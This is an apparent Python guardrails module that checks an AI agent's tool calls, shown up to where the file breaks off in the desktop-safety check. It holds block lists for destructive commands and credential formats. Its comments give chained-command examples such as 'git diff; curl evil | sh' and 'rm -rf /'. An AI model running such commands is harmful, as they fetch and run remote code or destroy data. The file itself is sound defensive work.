"""
Guardrails Framework — policy enforcement for tool calls.

Runs pre-execution checks on tool calls and post-execution checks on results.
Named policies are registered globally and enabled per-agent via YAML manifest.
All events are logged to the agent_guardrail_events table.
"""

from __future__ import annotations

import fnmatch
import logging
import re
import time
from collections import defaultdict
from dataclasses import dataclass, field
from datetime import UTC
from typing import Any

logger = logging.getLogger(__name__)

# Shell control characters that let a command chain/substitute/redirect past an
# allowlisted prefix (e.g. "git checkout -- f; rm -rf /" rides "^git checkout -- ").
# Matches ; | & < > newline (incl. \r) backtick, or $( command substitution.
# Intentionally NOT matched — these expand/split words but cannot introduce a
# second command on their own, so they don't defeat a prefix allowlist:
#   - bare $VAR / ${VAR} parameter expansion (e.g. ${IFS})
#   - tab and other horizontal whitespace
_SHELL_CONTROL = re.compile(r"[;|&<>\n\r`]|\$\(")

# Tools that send outbound email (subject to the inbound_only policy).
_EMAIL_SEND_TOOLS = frozenset({"gws_gmail_send", "gws_gmail_reply", "send_email", "send-email"})

# Every policy name the engine implements. Used to fail loud on an unknown
# (typo'd / renamed / not-yet-implemented) policy instead of silently allowing.
_KNOWN_PRE_POLICIES = frozenset(
    {
        "no_destructive_writes",
        "no_external_http",
        "no_main_branch_push",
        "no_secret_publication",
        "rate_limit",
        "exec_allowlist",
        "write_path_restrict",
        "desktop_safety",
        "human_approval",
        "recurring_meeting_proposal_required",
        "no_recent_changelog_reversal",
        "inbound_only",
    }
)
# requires_human_task_closure is enforced post-run (check_task_closure_post_run
# below) but was missing here — so the engine enforced a policy its own
# known-set called unknown, and the :243 unknown-policy log flagged every
# agent that declared it. tests/test_guardrail_list_agreement.py pins all the
# lists together now.
_KNOWN_POST_POLICIES = frozenset({"no_sensitive_data", "requires_human_task_closure"})
_KNOWN_POLICIES = _KNOWN_PRE_POLICIES | _KNOWN_POST_POLICIES

# Patterns for destructive commands
DESTRUCTIVE_PATTERNS = [
    re.compile(r"\brm\s+-rf\b", re.IGNORECASE),
    re.compile(r"\bDROP\s+TABLE\b", re.IGNORECASE),
    re.compile(r"\bDELETE\s+FROM\b", re.IGNORECASE),
    re.compile(r"\bTRUNCATE\b", re.IGNORECASE),
    re.compile(r"\bDROP\s+DATABASE\b", re.IGNORECASE),
    re.compile(r"\brm\s+-r\s+/", re.IGNORECASE),
]

# Patterns for sensitive data, paired with a human name. The name is what a
# guardrail is allowed to say out loud: quoting the match would put the secret
# into the transcript, the log line and the audit row — the guardrail becoming
# the leak it exists to prevent.
NAMED_SENSITIVE_PATTERNS: list[tuple[str, re.Pattern[str]]] = [
    ("AWS access key", re.compile(r"(?:AKIA|ASIA)[A-Z0-9]{16}")),
    # `sk-` followed by key-shaped material. The old pattern was
    # `sk-[a-zA-Z0-9]{20,}` — no dash, no underscore — which misses every
    # modern OpenAI project key (`sk-proj-...`) and missed the 47-character
    # key in WildClawBench's own fixture. A detector that only knows the
    # formats current when it was written quietly stops working.
    # No leading \b. Tool results are scanned as `str(payload)`, which escapes
    # newlines — so a key at the start of a line is preceded by the literal
    # character `n`, a word character, and a word boundary never matches. The
    # `sk-` prefix plus 16 key characters is distinctive enough on its own;
    # prose like "set your sk- key" has no such run after it.
    ("OpenAI-style API key", re.compile(r"sk-[A-Za-z0-9_-]{16,}")),
    # Classic `ghp_`/`gho_`/`ghu_`/`ghs_`/`ghr_` tokens and the newer
    # fine-grained `github_pat_` form.
    ("GitHub personal access token", re.compile(r"gh[pousr]_[A-Za-z0-9]{30,}")),
    ("GitHub fine-grained token", re.compile(r"github_pat_[A-Za-z0-9_]{30,}")),
    ("Slack bot token", re.compile(r"xoxb-[0-9]+-[a-zA-Z0-9]+")),
    ("private key", re.compile(r"-----BEGIN\s+(RSA\s+)?PRIVATE\s+KEY-----")),
]

SENSITIVE_PATTERNS = [pattern for _name, pattern in NAMED_SENSITIVE_PATTERNS]


#: Identifiers that name a credential. An assignment to one of these, bound to
#: a literal, is the shape that the format-based patterns above cannot see:
#: `client_password = "..."` is not a recognisable key FORMAT, which is why
#: WildClawBench's `leaked_api_pswd` stayed at zero after those were fixed.
_CREDENTIAL_IDENTIFIER = (
    r"[A-Za-z0-9_]*(?:passwd|password|secret|api[_-]?key|apikey|auth[_-]?token"
    r"|access[_-]?token|credential)[A-Za-z0-9_]*"
)

#: `name = "value"`, `"name": "value"`, `name: value`. Group 'val' is the
#: literal. Deliberately narrow: a bare string that merely looks random is not
#: evidence of anything, and treating it as such would redact half of every
#: source file an agent reads.
ASSIGNED_CREDENTIAL_PATTERN = re.compile(
    r"\b(?P<name>" + _CREDENTIAL_IDENTIFIER + r")\b"
    # An optional closing quote covers the JSON shape `"password": "..."`,
    # and the optional annotation covers `client_password: str = "..."`.
    # Without the latter the `:` reads as the assignment, the type name
    # fails the length test, and the real `=` is never reached — so every
    # typed codebase is invisible to this detector.
    #
    # The annotation may not cross a BRACE. A nested JSON object is the thing
    # it must not skip over: allowing braces let the branch step across one
    # and adopt a quoted token from INSIDE it as the value, so
    # `"access-token": {"type": "string", "format": "opaque-bearer"}` — a
    # schema declaring a field, with no credential anywhere — was read as
    # `access-token = opaque-bearer`. That is the shape `list_tasks` returns
    # for any task about a connector's auth, and it hard-blocked 14 runs in
    # 48 hours. A field NAMED after a credential is not a credential.
    #
    # Quotes are deliberately still ALLOWED here. Excluding them too made the
    # branch stop at the first quote of a quoted or subscripted annotation, so
    # `password: "SecretStr" = "<secret>"` read the `:` as the assignment and
    # redacted `SecretStr` — leaving the credential in the text — while
    # `password: 'str' = '<secret>'` matched nothing at all because `str` is
    # under the 8-character floor. Missing a real secret is the worse failure.
    r"[\"']?\s*(?::\s*[^=\n{}]{1,60})?\s*[=:]\s*"
    r"(?P<quote>[\"']?)"
    r"(?P<val>[^\s\"',;)}\]]{8,128})"
    r"(?P=quote)",
    re.IGNORECASE,
)

#: Values that are placeholders rather than credentials. Redacting these
#: trains the reader to ignore the marker, and fixtures and documentation are
#: full of them.
_PLACEHOLDER_VALUES = frozenset(
    {
        "changeme",
        "change_me",
        "password",
        "your-password-here",
        "yourpasswordhere",
        "placeholder",
        "example",
        "redacted",
        "notasecret",
        "hunter2000",
    }
)


def _first_assigned_credential(text: str) -> str | None:
    """The NAME of the first credential-shaped assignment, never the value."""
    for match in ASSIGNED_CREDENTIAL_PATTERN.finditer(text):
        if not _is_placeholder(match.group("val")):
            return str(match.group("name"))
    return None


def _redact_assigned_credentials(text: str) -> str:
    """Replace the VALUE in `password = "..."`, keeping the identifier.

    The agent still has to be able to say which file and which setting holds
    the credential; redacting the name as well would leave it unable to report
    anything actionable.
    """

    def _sub(match: re.Match[str]) -> str:
        val = match.group("val")
        if _is_placeholder(val):
            return match.group(0)
        quote = match.group("quote")
        return f"{match.group('name')}={quote}[REDACTED: credential]{quote}"

    return ASSIGNED_CREDENTIAL_PATTERN.sub(_sub, text)


def _is_placeholder(value: str) -> bool:
    """True for values that carry no secret: env lookups, interpolations,
    obvious dummies, and single-character padding like `xxxxxxxx`."""
    lowered = value.strip().lower()
    if lowered in _PLACEHOLDER_VALUES:
        return True
    if value.startswith(("$", "{", "<", "os.environ", "process.env")):
        return True
    if len(set(lowered)) <= 2:  # xxxxxxxx, --------, ........
        return True
    return "environ" in lowered or "getenv" in lowered


def redact_secrets(value: Any) -> Any:
    """Replace credential VALUES with a marker naming their kind.

    Telling a model not to repeat a secret is a request; not giving it the
    secret is a property. Measured on WildClawBench 2026-08-24: once the agent
    was told a credential was present it did everything right — identified it,
    warned the user, refused the push — and still failed, because while
    explaining the danger it quoted the key. An agent that pastes a live
    credential into a transcript has leaked it into every log and session
    store that transcript reaches, however good its advice was.

    The agent still needs to know a credential is there and what kind it is,
    so the marker says so. It never needs the characters.

    Walks dicts and lists because tool results are structured; leaves
    non-string scalars alone so exit codes stay integers.
    """
    if isinstance(value, str):
        redacted = value
        for name, pattern in NAMED_SENSITIVE_PATTERNS:
            redacted = pattern.sub(f"[REDACTED: {name}]", redacted)
        return _redact_assigned_credentials(redacted)
    if isinstance(value, dict):
        return {k: redact_secrets(v) for k, v in value.items()}
    if isinstance(value, list):
        return [redact_secrets(v) for v in value]
    return value


#: Upper bound on how much tool output is scanned for credentials. Large
#: enough that ordinary file reads and diffs are covered end to end; finite so
#: a pathological multi-megabyte payload cannot stall the loop.
SENSITIVE_SCAN_LIMIT = 2_000_000

# Default rate limit
#: Per-minute tool-call ceiling, applied per agent. Override per agent with
#: `rate_limit_per_minute`.
#:
#: MEASURED on this instance 2026-08-24, and left unchanged deliberately:
#: 127 `rate_limit` blocks in 30 days (most recent that day), against a
#: legitimate distribution whose mean is 7.2 calls/minute and whose peak is
#: 36.8 across 900 real runs. So 30 sits just under the top of normal
#: behaviour and does block real work — it should probably be higher.
#:
#: It is not raised here because raising it turned three tests in
#: test_plan_mode into runaway loops: they had been relying on this throttle
#: to terminate, which means it has been doing duty as a de-facto runaway
#: guard well beyond its stated job. Changing a fleet-wide default whose
#: removal destabilises things nobody had connected to it is a soak, not a
#: side effect of adding a knob. The knob is the part that ships.
DEFAULT_RATE_LIMIT = 30  # per minute

# Default guardrails applied to all agents unless opted out
DEFAULT_GUARDRAILS = [
    "no_destructive_writes",
    "no_sensitive_data",
    "rate_limit",
    # Publishing a credential the agent has already been shown is not
    # something a caller should have to opt IN to being protected from.
    "no_secret_publication",
]

# Human-readable descriptions for LLM prompt injection
POLICY_DESCRIPTIONS: dict[str, str] = {
    "no_destructive_writes": "Destructive shell commands (rm -rf, DROP TABLE, DELETE FROM, TRUNCATE) are blocked.",
    "no_sensitive_data": "Tool outputs are scanned for exposed API keys and secrets.",
    "rate_limit": f"Tool calls are rate-limited to {DEFAULT_RATE_LIMIT}/minute.",
    "no_external_http": "Web fetch and web search tools are blocked.",
    "no_main_branch_push": "Git push/commit to main/master branches is blocked.",
    "no_secret_publication": (
        "Committing or pushing content that contains a detected credential is "
        "blocked; report the credential to the user instead."
    ),
    "exec_allowlist": "Shell commands are restricted to an explicit allowlist.",
    "write_path_restrict": "File writes are restricted to specific paths.",
    "desktop_safety": "Desktop automation has additional safety checks (no terminal emulators, no dangerous key combos).",
    "human_approval": "Certain tools require explicit human approval before execution.",
    "requires_human_task_closure": (
        "If this run reads a task with requires_human=true and does not close or update it, "
        "the engine auto-marks that task IN_PROGRESS at run-end so the next heartbeat will not re-pick it. "
        "To fully close, call update_task(status=DONE) or resolve_task explicitly."
    ),
    "inbound_only": (
        "Outbound email sending is blocked except replies to inbound mail; "
        "first-contact sends require approval."
    ),
    "no_recent_changelog_reversal": (
        "For writes to docs/agents/*.yaml, any top-level field touched in a changelog entry "
        "dated within the last 14 days cannot be modified again. Prevents thrash where a "
        "parameter ping-pongs between values without converging."
    ),
    "recurring_meeting_proposal_required": (
        "Creating a calendar invite with ≥3 external attendees, >7 days in the future, or recurring cadence "
        "is blocked unless a prior step in this run proposed the time via email, or attendee_confirmed=true."
    ),
}


def _owner_email_cached() -> str:
    """Lookup operator email for domain-classification — cheap + cache-less."""
    try:
        from robothor.engine.tools.handlers.gws import _resolve_owner_email

        return _resolve_owner_email()
    except Exception:
        import os as _os

        return _os.environ.get("ROBOTHOR_OWNER_EMAIL", "").strip().lower()


def _lookup_scheduling_policies(emails: list[str]) -> dict[str, str]:
    """Map each email to its crm_people.scheduling_policy (if non-default).

    Queries ``crm_people.email`` directly (case-insensitive). Emails not in CRM
    are omitted. Any DB / schema failure (e.g. column absent before migration)
    returns an empty dict silently — the guardrail falls back to its email
    heuristic signals only.
    """
    normalized = [e.strip().lower() for e in emails if e and "@" in e]
    if not normalized:
        return {}
    try:
        from robothor.crm.dal import get_connection

        with get_connection() as conn:
            cur = conn.cursor()
            cur.execute(
                "SELECT lower(email), scheduling_policy "
                "FROM crm_people "
                "WHERE deleted_at IS NULL AND lower(email) = ANY(%s)",
                (normalized,),
            )
            rows = cur.fetchall()
    except Exception:
        return {}

    out: dict[str, str] = {}
    for row in rows or []:
        email = row[0]
        policy = (row[1] or "stable").strip()
        if policy and policy != "stable":
            out[email] = policy
    return out


def _days_from_now(start: str) -> float | None:
    """Parse an RFC3339 start string and return days between now (UTC) and then.

    Returns None if unparseable so callers can skip the check rather than crash.
    """
    from datetime import datetime

    if not start:
        return None
    try:
        dt = datetime.fromisoformat(start)
    except ValueError:
        return None
    now = datetime.now(tz=UTC)
    return (dt - now).total_seconds() / 86400.0


def guardrail_summary(policies: list[str]) -> str:
    """Return a concise system prompt section describing active guardrails.

    Helps the LLM self-regulate and avoid hitting guardrails blindly.
    Returns empty string if no policies are active.
    """
    if not policies:
        return ""
    lines = ["## Active Safety Guardrails"]
    for policy in policies:
        desc = POLICY_DESCRIPTIONS.get(policy, f"{policy} (custom policy)")
        lines.append(f"- {desc}")
    lines.append(
        "\nIf a tool call is blocked by a guardrail, you will receive an error. "
        "Do not attempt to work around guardrail restrictions."
    )
    return "\n".join(lines)


def compute_effective_guardrails(
    configured: list[str],
    opt_out: bool = False,
) -> list[str]:
    """Compute effective guardrail list by merging defaults with agent config.

    If opt_out is True, only use explicitly configured guardrails.
    Otherwise, merge DEFAULT_GUARDRAILS with configured (deduplicated).
    """
    if opt_out:
        return configured

    # Merge: defaults + agent-specific, deduplicated, preserving order
    seen: set[str] = set()
    result: list[str] = []
    for policy in DEFAULT_GUARDRAILS + configured:
        if policy not in seen:
            seen.add(policy)
            result.append(policy)
    return result


@dataclass
class GuardrailResult:
    """Result of a guardrail check."""

    allowed: bool = True
    # allowed, blocked, warned, escalate, observed
    # "observed" = allowed, but a rollout-gated guardrail WOULD have blocked the
    # call in enforce mode. The caller must persist it (agent_guardrail_events)
    # so an observe-mode soak yields real promotion evidence rather than silence.
    action: str = "allowed"
    reason: str = ""
    guardrail_name: str = ""


@dataclass
class GuardrailEngine:
    """Runs pre/post execution checks based on enabled policies."""

    enabled_policies: list[str] = field(default_factory=list)
    workspace: str = ""  # Workspace root for normalizing absolute paths
    #: Per-minute tool-call ceiling. 0 means "use the platform default" —
    #: an unset field must never read as "block everything".
    rate_limit_per_minute: int = 0
    _exec_allowlists: dict[str, list[re.Pattern]] = field(default_factory=dict)  # type: ignore[type-arg]
    _write_allowlists: dict[str, list[str]] = field(default_factory=dict)
    _rate_counts: dict[str, list[float]] = field(default_factory=lambda: defaultdict(list))
    _human_approval_patterns: dict[str, list[str]] = field(default_factory=dict)

    def __post_init__(self) -> None:
        # Fail loud on a policy the engine can't enforce. A typo'd/renamed/
        # unimplemented policy previously fell through to "allowed", silently
        # disabling the guardrail the operator believed was active (audit
        # 2026-05-29). We log rather than raise so one bad name can't crash the
        # whole engine, but the ERROR is impossible to miss.
        unknown = [
            p
            for p in self.enabled_policies
            if p not in _KNOWN_POLICIES and self._plugin_guardrail(p) is None
        ]
        if unknown:
            logger.error(
                "Unknown guardrail policy(ies) %s — NOT ENFORCED. Known: %s",
                sorted(unknown),
                sorted(_KNOWN_POLICIES),
            )

    def _plugin_guardrails(self) -> dict[str, Any]:
        """Guardrails contributed by installed plugins, cached per engine.

        #411 declared the `genus.guardrails` entry-point group and nothing
        consumed it; #421 made plugin TOOLS reachable and left this group
        declared-but-unconsumed. A competitive audit rated the platform "far
        behind" on extensibility partly for that.
        """
        from robothor.plugins import generation

        current = generation()
        cache: dict[str, Any] | None = self.__dict__.get("_plugin_guardrail_cache")
        if cache is not None and self.__dict__.get("_plugin_guardrail_generation") == current:
            return cache
        try:
            from robothor.plugins import load_plugins

            loaded = load_plugins(reserved_names=set(_KNOWN_POLICIES))
            cache = dict(loaded.guardrails or {})
        except Exception as e:  # noqa: BLE001 - a plugin must not break safety
            logger.warning("Plugin guardrails unavailable: %s", e)
            cache = {}
        self.__dict__["_plugin_guardrail_cache"] = cache
        self.__dict__["_plugin_guardrail_generation"] = current
        return cache

    def _plugin_guardrail(self, policy: str) -> Any:
        """The plugin callable for `policy`, or None.

        A built-in always wins: otherwise an installed package could quietly
        neuter `no_destructive_writes` by claiming the name.
        """
        if policy in _KNOWN_POLICIES:
            return None
        return self._plugin_guardrails().get(policy)

    def _run_plugin_guardrail(
        self, policy: str, handler: Any, tool_name: str, tool_args: dict[str, Any]
    ) -> GuardrailResult:
        """Call a plugin guardrail. A broken package must not break the call.

        Returning ALLOW on a plugin error is deliberate and is the one place
        this file fails open: a third-party package that raises must not be
        able to halt the fleet. The warning is how it stays visible.
        """
        try:
            verdict = handler(tool_name, tool_args, None)
        except Exception as e:  # noqa: BLE001
            logger.warning("Plugin guardrail %r raised (%s) — allowing", policy, e)
            return GuardrailResult()
        if verdict is None or verdict is True:
            return GuardrailResult()
        if isinstance(verdict, GuardrailResult):
            return verdict
        if isinstance(verdict, dict):
            return GuardrailResult(
                allowed=bool(verdict.get("allowed", False)),
                action=str(verdict.get("action", "blocked")),
                reason=str(verdict.get("reason", "")),
                guardrail_name=policy,
            )
        logger.warning(
            "Plugin guardrail %r returned %s, expected GuardrailResult/dict/None — allowing",
            policy,
            type(verdict).__name__,
        )
        return GuardrailResult()

    def check_pre_execution(
        self,
        tool_name: str,
        tool_args: dict[str, Any],
        agent_id: str = "",
        prior_steps: list[Any] | None = None,
    ) -> GuardrailResult:
        """Run all enabled pre-execution guardrails on a tool call.

        prior_steps is an optional list of this run's completed RunStep objects
        (in order). Guardrails that need to inspect context from earlier in the
        run (e.g. "did we already propose the time via email?") read it.
        """
        observation: GuardrailResult | None = None
        for policy in self.enabled_policies:
            result = self._run_pre_policy(policy, tool_name, tool_args, agent_id, prior_steps or [])
            if not result.allowed:
                return result
            # A rollout-gated guardrail in observe mode allows the call but flags
            # it. Carry the first such observation out so the caller can record
            # it; dropping it here is what made observe-mode soaks look silent.
            if observation is None and result.action == "observed":
                observation = result
        return observation or GuardrailResult()

    def check_post_execution(
        self,
        tool_name: str,
        tool_output: Any,
    ) -> GuardrailResult:
        """Run all enabled post-execution guardrails on tool output."""
        for policy in self.enabled_policies:
            result = self._run_post_policy(policy, tool_name, tool_output)
            if result.action == "warned":
                return result
        return GuardrailResult()

    def _run_pre_policy(
        self,
        policy: str,
        tool_name: str,
        tool_args: dict[str, Any],
        agent_id: str,
        prior_steps: list[Any],
    ) -> GuardrailResult:
        """Dispatch to the correct pre-execution policy."""
        if policy == "no_destructive_writes":
            return self._check_destructive(tool_name, tool_args)
        if policy == "no_external_http":
            return self._check_external_http(tool_name)
        if policy == "no_secret_publication":
            return self._check_secret_publication(tool_name, tool_args, prior_steps)
        if policy == "no_main_branch_push":
            return self._check_no_main_branch(tool_name, tool_args)
        if policy == "rate_limit":
            return self._check_rate_limit(agent_id)
        if policy == "exec_allowlist":
            return self._check_exec_allowlist(tool_name, tool_args, agent_id)
        if policy == "write_path_restrict":
            return self._check_write_path(tool_name, tool_args, agent_id)
        if policy == "desktop_safety":
            return self._check_desktop_safety(tool_name, tool_args)
        if policy == "human_approval":
            return self._check_human_approval(tool_name, tool_args, agent_id)
        if policy == "recurring_meeting_proposal_required":
            return self._check_recurring_meeting_proposal(tool_name, tool_args, prior_steps)
        if policy == "no_recent_changelog_reversal":
            return self._check_changelog_reversal(tool_name, tool_args)
        if policy == "inbound_only":
            return self._check_inbound_only(tool_name, tool_args)
        handler = self._plugin_guardrail(policy)
        if handler is not None:
            return self._run_plugin_guardrail(policy, handler, tool_name, tool_args)
        return GuardrailResult()

    def _run_post_policy(
        self,
        policy: str,
        tool_name: str,
        tool_output: Any,
    ) -> GuardrailResult:
        """Dispatch to the correct post-execution policy."""
        if policy == "no_sensitive_data":
            return self._check_sensitive_output(tool_name, tool_output)
        return GuardrailResult()

    def _check_destructive(self, tool_name: str, tool_args: dict[str, Any]) -> GuardrailResult:
        """Block destructive commands in exec/shell tools."""
        if tool_name not in ("exec", "shell"):
            return GuardrailResult()

        command = str(tool_args.get("command", ""))
        for pattern in DESTRUCTIVE_PATTERNS:
            if pattern.search(command):
                return GuardrailResult(
                    allowed=False,
                    action="blocked",
                    reason=f"Destructive command blocked: {pattern.pattern}",
                    guardrail_name="no_destructive_writes",
                )
        return GuardrailResult()

    def _check_external_http(self, tool_name: str) -> GuardrailResult:
        """Block web_fetch/web_search for isolated agents."""
        if tool_name in ("web_fetch", "web_search"):
            return GuardrailResult(
                allowed=False,
                action="blocked",
                reason=f"External HTTP blocked for this agent: {tool_name}",
                guardrail_name="no_external_http",
            )
        return GuardrailResult()

    def _check_rate_limit(self, agent_id: str) -> GuardrailResult:
        """Rate limit: max N tool calls per minute, per agent."""
        limit = self.rate_limit_per_minute or DEFAULT_RATE_LIMIT
        now = time.monotonic()
        key = agent_id or "_default"
        calls = self._rate_counts[key]

        # Prune calls older than 60s
        cutoff = now - 60
        self._rate_counts[key] = [t for t in calls if t > cutoff]
        calls = self._rate_counts[key]

        if len(calls) >= limit:
            return GuardrailResult(
                allowed=False,
                action="blocked",
                reason=f"Rate limit exceeded: {len(calls)}/{limit} calls/min",
                guardrail_name="rate_limit",
            )
        calls.append(now)
        return GuardrailResult()

    def _check_no_main_branch(self, tool_name: str, tool_args: dict[str, Any]) -> GuardrailResult:
        """Block git operations targeting main/master branches."""
        protected = {"main", "master"}

        if tool_name == "git_branch":
            branch = tool_args.get("branch_name", "")
            if branch in protected:
                return GuardrailResult(
                    allowed=False,
                    action="blocked",
                    reason=f"Cannot create/switch to protected branch: {branch}",
                    guardrail_name="no_main_branch_push",
                )

        if tool_name == "git_push":
            # The tool itself checks the current branch, but this guardrail provides
            # a belt-and-suspenders pre-execution check
            return GuardrailResult()  # Allowed — tool enforces at runtime

        if tool_name == "git_commit":
            # git_commit also checks branch at runtime, guardrail is advisory here
            return GuardrailResult()

        # Block any exec command that looks like git push to main/master
        if tool_name in ("exec", "shell"):
            command = str(tool_args.get("command", ""))
            for branch in protected:
                if re.search(rf"\bgit\s+push\b.*\b{branch}\b", command):
                    return GuardrailResult(
                        allowed=False,
                        action="blocked",
                        reason=f"Cannot push to protected branch via exec: {branch}",
                        guardrail_name="no_main_branch_push",
                    )

        return GuardrailResult()

    def _check_exec_allowlist(
        self, tool_name: str, tool_args: dict[str, Any], agent_id: str
    ) -> GuardrailResult:
        """Block exec/shell commands not matching the agent's allowlist patterns.

        The command runs via ``/bin/sh -c``, so an allowlist pattern that only
        anchors the *prefix* (e.g. ``^git diff``) is trivially defeated by
        shell chaining: ``git diff; curl evil | sh`` matches the prefix and then
        runs anything. When an allowlist is active we therefore reject shell
        metacharacters outright — the allowlisted commands in practice are
        single, simple invocations that never need them (audit 2026-05-29).
        """
        if tool_name not in ("exec", "shell"):
            return GuardrailResult()
        patterns = self._exec_allowlists.get(agent_id, [])
        if not patterns:  # No allowlist configured = no restriction (backward compat)
            return GuardrailResult()
        command = str(tool_args.get("command", ""))

        # A pattern that matches the WHOLE command is a different, stronger
        # contract than a prefix: `^git diff$` can never match
        # `git diff; rm -rf /`, so chaining cannot extend it and the
        # metacharacter ban below is unnecessary. That matters: the ban is
        # exactly what stops the six agents holding arbitrary host shell
        # (main, conversation-inbox, crm-hygiene, vision-monitor,
        # auto-researcher, email-analyst) from being given an allowlist at all,
        # because their real commands need `2>/dev/null` and `|| true`.
        #
        # So: approve the exact command shape, keep the ban for prefixes.
        if any(p.fullmatch(command) for p in patterns):
            return GuardrailResult()

        # Reject shell-chaining metacharacters that let a command ride past an
        # allowlisted *prefix* (e.g. "git checkout -- f; rm -rf /"). Flag-gated:
        # off = legacy behavior; observe = log-only; enforce = block.
        from robothor.engine.feature_flags import exec_allowlist_mode

        mode = exec_allowlist_mode()
        observed_reason = ""
        if mode != "off" and _SHELL_CONTROL.search(command):
            reason = f"shell control characters not permitted in allowlisted exec: {command[:100]}"
            if mode == "enforce":
                return GuardrailResult(
                    allowed=False,
                    action="blocked",
                    reason=reason,
                    guardrail_name="exec_allowlist",
                )
            logger.warning(
                "exec_allowlist would block shell metacharacters for agent %s (mode=%s): %s",
                agent_id,
                mode,
                command[:100],
            )
            observed_reason = reason
            if mode == "alert":
                # The middle rung: observe + put it in front of the operator.
                from robothor.engine.feature_flags import notify_guardrail_alert

                notify_guardrail_alert(
                    guardrail_name="exec_allowlist",
                    agent_id=agent_id,
                    reason=reason,
                )

        for pattern in patterns:
            if pattern.search(command):
                # Command clears the allowlist. If strict mode would have blocked
                # it, surface that as an "observed" event so the soak has real
                # evidence — silence must not be mistakable for cleanliness.
                if observed_reason:
                    return GuardrailResult(
                        allowed=True,
                        action="observed",
                        reason=observed_reason,
                        guardrail_name="exec_allowlist",
                    )
                return GuardrailResult()
        return GuardrailResult(
            allowed=False,
            action="blocked",
            reason=f"exec command not in allowlist: {command[:100]}",
            guardrail_name="exec_allowlist",
        )

    def _check_inbound_only(self, tool_name: str, tool_args: dict[str, Any]) -> GuardrailResult:
        """Allow email sends only as a reply within an existing thread.

        Prevents an ``inbound_only`` agent from initiating cold outbound mail: a
        send is permitted only when it carries a ``thread_id`` (i.e. it replies
        into an existing Gmail thread). A bare ``in_reply_to`` is deliberately
        NOT sufficient — without a ``thread_id`` Gmail starts a brand-new thread,
        so it would let cold outreach masquerade as a reply. This policy was
        enabled in a manifest but had no handler, so it silently did nothing
        (audit 2026-05-29).

        Residual limitation: a fabricated ``thread_id`` is not validated against
        the inbound message store, so this blocks the common cold-send path but
        is not a hard guarantee — full thread-provenance validation is a
        follow-up.
        """
        if tool_name not in _EMAIL_SEND_TOOLS:
            return GuardrailResult()
        thread_id = str(tool_args.get("thread_id", "") or "").strip()
        if thread_id:
            return GuardrailResult()
        return GuardrailResult(
            allowed=False,
            action="blocked",
            reason=(
                "inbound_only: outbound email must reply within an existing thread "
                "(set thread_id); cold outreach is not allowed"
            ),
            guardrail_name="inbound_only",
        )

    def _check_write_path(
        self, tool_name: str, tool_args: dict[str, Any], agent_id: str
    ) -> GuardrailResult:
        """Block write_file to paths not matching the agent's allowlist globs."""
        if tool_name != "write_file":
            return GuardrailResult()
        patterns = self._write_allowlists.get(agent_id, [])
        if not patterns:  # No allowlist = no restriction
            return GuardrailResult()
        path = str(tool_args.get("path", ""))
        # Normalize absolute paths to workspace-relative for matching
        ws = self.workspace.rstrip("/") + "/" if self.workspace else ""
        if ws and path.startswith(ws):
            path = path[len(ws) :]
        for pattern in patterns:
            if fnmatch.fnmatch(path, pattern):
                return GuardrailResult()
        return GuardrailResult(
            allowed=False,
            action="blocked",
            reason=f"write_file path not allowed: {path}",
            guardrail_name="write_path_restrict",
        )

    def _check_changelog_reversal(
        self, tool_name: str, tool_args: dict[str, Any]
    ) -> GuardrailResult:
        """Block writes to agent manifests that re-edit a field touched in the
        last 14 days per the manifest's own ``changelog:`` block.

        Rationale: the AutoAgent changelog has shown visible thrash
        (``max_iterations`` moved 30→20→100→30 in two weeks, never settling).
        One edit per top-level field per 14-day window forces a learn/measure
        pause before the next adjustment. The check is conservative — it does
        not try to detect exact reversions, just repeated touches.

        Only engages on writes to ``docs/agents/*.yaml``. Any read / parse
        failure opens the gate (fail-safe for legitimate edits).
        """
        if tool_name != "write_file":
            return GuardrailResult()
        path = str(tool_args.get("path", ""))
        ws = self.workspace.rstrip("/") + "/" if self.workspace else ""
        rel_path = path[len(ws) :] if ws and path.startswith(ws) else path
        if not fnmatch.fnmatch(rel_path, "docs/agents/*.yaml"):
            return GuardrailResult()

        from datetime import datetime, timedelta
        from pathlib import Path

        import yaml as _yaml

        abs_path = Path(path) if Path(path).is_absolute() else Path(ws + rel_path if ws else path)
        if not abs_path.exists():
            return GuardrailResult()

        try:
            old_text = abs_path.read_text()
            old_data = _yaml.safe_load(old_text) or {}
            new_data = _yaml.safe_load(str(tool_args.get("content", ""))) or {}
        except (OSError, _yaml.YAMLError):
            return GuardrailResult()

        changelog = old_data.get("changelog") or []
        if not isinstance(changelog, list):
            return GuardrailResult()

        cutoff = datetime.now(UTC).replace(tzinfo=None) - timedelta(days=14)
        top_level_fields = set(old_data.keys()) | set(new_data.keys())
        touched: set[str] = set()
        for entry in changelog:
            if not isinstance(entry, dict):
                continue
            date_str = str(entry.get("date", ""))
            try:
                entry_date = datetime.fromisoformat(date_str)
            except ValueError:
                continue
            if entry_date < cutoff:
                continue
            change_text = str(entry.get("change", ""))
            # Heuristic: a token is "touched" when it appears in the change text
            # and also matches a current top-level manifest key.
            for field_name in top_level_fields:
                if field_name == "changelog":
                    continue
                if re.search(rf"\b{re.escape(field_name)}\b", change_text):
                    touched.add(field_name)

        if not touched:
            return GuardrailResult()

        # Identify top-level fields that changed between old and new.
        changed: list[str] = []
        for field_name in top_level_fields:
            if field_name == "changelog":
                continue
            if old_data.get(field_name) != new_data.get(field_name):
                changed.append(field_name)

        conflicting = sorted(set(changed) & touched)
        if not conflicting:
            return GuardrailResult()

        return GuardrailResult(
            allowed=False,
            action="blocked",
            reason=(
                f"Changelog reversal blocked: fields {conflicting} were touched "
                f"in {rel_path}'s changelog within the last 14 days. "
                "Wait for the current change to soak, or update the changelog "
                "entry in place rather than adding a new reversal."
            ),
            guardrail_name="no_recent_changelog_reversal",
        )

    def _check_desktop_safety(self, tool_name: str, tool_args: dict[str, Any]) -> GuardrailResult:
        """Safety guardrails for desktop control and browser tools."""
        # Block launching terminal emulators (use exec tool instead)
        if tool_name == "desktop_launch":
            app = str(tool_args.get("app", "")).lower()
            blocked_apps = {
                "bash",
                "sh",
                "zsh",
                "fish",
                "xterm",
                "gnome-terminal",
                "konsole",
                "alacritty",
                "kitty",
                "terminal",
                "xfce4-terminal",
            }
            app_base = app.rsplit("/", 1)[-1]
            if app_base in blocked_apps:
                return GuardrailResult(
                    allowed=False,
                    action="blocked",
                    reason=f"Cannot launch terminal emulator '{app}' — use the exec tool for shell commands",
                    guardrail_name="desktop_safety",
                )

        # Block dangerous key combinations
        if tool_name == "desktop_key":
            combo = str(tool_args.get("key", "")).lower().replace(" ", "")
            dangerous_combos = {
                "ctrl+alt+delete",
